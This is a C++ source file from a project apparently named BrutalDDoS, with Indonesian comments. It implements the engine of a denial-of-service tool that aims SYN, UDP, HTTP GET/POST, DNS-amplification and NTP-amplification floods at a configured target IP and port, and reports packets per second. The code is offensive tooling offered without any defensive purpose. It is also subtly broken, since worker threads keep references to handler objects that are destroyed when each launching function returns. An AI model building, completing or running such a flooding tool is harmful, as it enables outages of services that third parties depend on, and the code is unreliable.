#include "AttackEngine.h"
#include "Logger.h"
#include <iostream>
#include <sstream>
#include <algorithm>
#include <random>

namespace BrutalDDoS {

// Helper untuk membuat logger unik per instance atau shared
static std::shared_ptr<spdlog::logger> create_logger() {
    auto logger = spdlog::stdout_color_mt("attack_engine");
    logger->set_level(spdlog::level::info);
    return logger;
}

AttackEngine::AttackEngine(const AttackConfig& config, 
                           std::shared_ptr<PacketGenerator> packet_generator,
                           std::shared_ptr<SocketManager> socket_manager)
    : config_(config),
      packet_generator_(std::move(packet_generator)),
      socket_manager_(std::move(socket_manager)),
      logger_(create_logger()) {
    
    if (!packet_generator_ || !socket_manager_) {
        throw std::invalid_argument("PacketGenerator dan SocketManager harus diinisialisasi.");
    }
    
    logger_->info("AttackEngine initialized with config: IP={}, Port={}, Mode={}", 
                  config_.target_ip, config_.target_port, 
                  static_cast<int>(config_.mode));
}

AttackEngine::~AttackEngine() {
    stop();
    logger_->info("AttackEngine destroyed.");
}

bool AttackEngine::start() {
    if (running_.exchange(true)) {
        logger_->warn("Serangan sudah berjalan. Gunakan stop() dulu.");
        return false;
    }

    start_time_ = std::chrono::steady_clock::now();
    total_packets_sent_.store(0);
    errors_count_.store(0);

    try {
        switch (config_.mode) {
            case AttackMode::SYN_FLOOD:
                runSynFlood();
                break;
            case AttackMode::UDP_FLOOD:
                runUdpFlood();
                break;
            case AttackMode::HTTP_GET:
                runHttpGetFlood();
                break;
            case AttackMode::HTTP_POST:
                runHttpPostFlood();
                break;
            case AttackMode::DNS_AMPLIFICATION:
                runDnsAmplification();
                break;
            case AttackMode::NTP_AMPLIFICATION:
                runNtpAmplification();
                break;
            case AttackMode::ALL:
                runAllModes();
                break;
            default:
                logger_->error("Mode serangan tidak didukung: {}", static_cast<int>(config_.mode));
                running_.store(false);
                return false;
        }
        
        logger_->info("Serangan dimulai pada {}:{} dengan mode {}", 
                      config_.target_ip, config_.target_port, 
                      config_.mode == AttackMode::ALL ? "ALL" : "SINGLE_MODE");
        
        // Jalankan loop monitoring status jika verbose
        if (config_.verbose) {
            worker_threads_.emplace_back([this]() {
                while (running_) {
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                    logStatus();
                }
            });
        }

        return true;

    } catch (const std::exception& e) {
        logger_->error("Gagal memulai serangan: {}", e.what());
        running_.store(false);
        return false;
    }
}

void AttackEngine::stop() {
    if (!running_.exchange(false)) {
        return; // Sudah berhenti
    }

    logger_->info("Menghentikan serangan...");
    
    // Tandai semua worker thread untuk berhenti
    // Biasanya dilakukan via atomic flag 'running_' yang diperiksa di loop masing-masing thread
    
    // Join semua thread
    for (auto& t : worker_threads_) {
        if (t.joinable()) {
            t.join();
        }
    }
    
    worker_threads_.clear();
    
    auto end_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time_).count();
    
    logger_->info("Serangan berakhir. Total waktu: {} detik", duration);
    logger_->info("Total paket terkirim: {}, Total error: {}", 
                  total_packets_sent_.load(), errors_count_.load());
}

void AttackEngine::runSynFlood() {
    SynFloodHandler handler(config_, packet_generator_, socket_manager_);
    handler.start(config_.thread_count);
    
    // Simpan thread handler ke vector agar bisa di-stop nanti
    // Catatan: Implementasi SynFloodHandler harus expose getThreads() atau similar
    // Untuk contoh ini, kita asumsikan handler mengelola thread internalnya sendiri
    // dan akan berhenti ketika flag 'running_' menjadi false.
    
    // Kita buat wrapper thread yang memanggil handler dan menunggu
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runUdpFlood() {
    UdpFloodHandler handler(config_, packet_generator_, socket_manager_);
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runHttpGetFlood() {
    HttpFloodHandler handler(config_, packet_generator_, socket_manager_);
    handler.setMethod(HttpFloodHandler::Method::GET);
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runHttpPostFlood() {
    HttpFloodHandler handler(config_, packet_generator_, socket_manager_);
    handler.setMethod(HttpFloodHandler::Method::POST);
    handler.setPayloadSize(config_.payload_size);
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runDnsAmplification() {
    DnsAmplificationHandler handler(config_, packet_generator_, socket_manager_);
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runNtpAmplification() {
    NtpAmplificationHandler handler(config_, packet_generator_, socket_manager_);
    worker_threads_.emplace_back([this, &handler]() {
        handler.run();
    });
}

void AttackEngine::runAllModes() {
    // Jalankan semua mode secara paralel
    // Setiap mode berjalan di thread terpisah
    
    std::vector<std::function<void()>> modes;
    modes.push_back([this]() { runSynFlood(); });
    modes.push_back([this]() { runUdpFlood(); });
    modes.push_back([this]() { runHttpGetFlood(); });
    modes.push_back([this]() { runHttpPostFlood(); });
    modes.push_back([this]() { runDnsAmplification(); });
    modes.push_back([this]() { runNtpAmplification(); });

    for (auto& mode : modes) {
        worker_threads_.emplace_back([&mode]() {
            mode();
        });
    }
}

void AttackEngine::logStatus() {
    std::lock_guard<std::mutex> lock(status_mutex_);
    
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time_).count();
    
    if (elapsed == 0) elapsed = 1; // Hindari pembagian nol
    
    uint64_t current_packets = total_packets_sent_.load();
    double pps = static_cast<double>(current_packets) / elapsed;
    
    logger_->info("Status: PPS={:.2f}, Total Packets={}", pps, current_packets);
}

std::string AttackEngine::getStatusReport() const {
    std::lock_guard<std::mutex> lock(status_mutex_);
    
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time_).count();
    if (elapsed == 0) elapsed = 1;
    
    uint64_t current_packets = total_packets_sent_.load();
    double pps = static_cast<double>(current_packets) / elapsed;
    double err_rate = (errors_count_.load() > 0) ? 
                      (static_cast<double>(errors_count_.load()) / current_packets * 100) : 0.0;
    
    std::ostringstream oss;
    oss << "=== Attack Status Report ===\n";
    oss << "Target: " << config_.target_ip << ":" << config_.target_port << "\n";
    oss << "Mode: " << (config_.mode == AttackMode::ALL ? "ALL" : "SINGLE") << "\n";
    oss << "Elapsed Time: " << elapsed << " seconds\n";
    oss << "Packets Per Second (PPS): " << pps << "\n";
    oss << "Total Packets Sent: " << current_packets << "\n";
    oss << "Errors: " << errors_count_.load() << " (" << err_rate << "%)\n";
    oss << "===========================";
    
    return oss.str();
}

void AttackEngine::updateConfig(const AttackConfig& new_config) {
    std::lock_guard<std::mutex> lock(status_mutex_);
    
    // Update hanya field yang relevan tanpa mengganggu thread yang sedang berjalan
    if (new_config.target_ip != "") config_.target_ip = new_config.target_ip;
    if (new_config.target_port != 0) config_.target_port = new_config.target_port;
    if (new_config.thread_count > 0) config_.thread_count = new_config.thread_count;
    if (new_config.http_rps > 0) config_.http_rps = new_config.http_rps;
    if (new_config.payload_size > 0) config_.payload_size = new_config.payload_size;
    
    logger_->info("Konfigurasi diperbarui: IP={}, Port={}, Threads={}", 
                  config_.target_ip, config_.target_port, config_.thread_count);
}

void AttackEngine::setupLogger() {
    // Logger sudah diinisialisasi di konstruktor
}

void AttackEngine::cleanupThreads() {
    for (auto& t : worker_threads_) {
        if (t.joinable()) {
            t.join();
        }
    }
    worker_threads_.clear();
}

} // namespace BrutalDDoS
